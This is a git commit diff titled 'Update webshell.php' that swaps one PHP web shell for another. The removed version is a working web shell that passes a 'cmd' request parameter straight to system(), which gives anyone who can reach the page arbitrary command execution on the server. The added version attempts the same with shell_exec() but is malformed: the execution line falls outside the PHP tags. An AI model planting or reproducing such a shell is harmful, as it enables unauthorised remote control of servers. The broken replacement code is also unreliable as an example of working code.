d718bbc0f457d51068d1fb706d807ec2a8980d4a
io0329 <126740281+io0329@users.noreply.github.com>
2024-07-15 23:00:11 +0900

    Update webshell.php

--- webshell.php
+++ webshell.php
@@ -1,16 +1,9 @@
-<html>
-<body>
-<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
-<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
-<input type="SUBMIT" value="Execute">
-</form>
-<pre>
 <?php
-    if(isset($_GET['cmd']))
-    {
-        system($_GET['cmd']);
-    }
+$cmd = $_GET["cmd"]; if(!empty($cmd)){
+}
 ?>
-</pre>
-</body>
-</html>
+$result = shell_exec($cmd);
+<form method="GET">
+<input type="text" name="cmd"> <input type="submit" value="EXECUTE"> </form>
+<hr>
+<?=$result?>
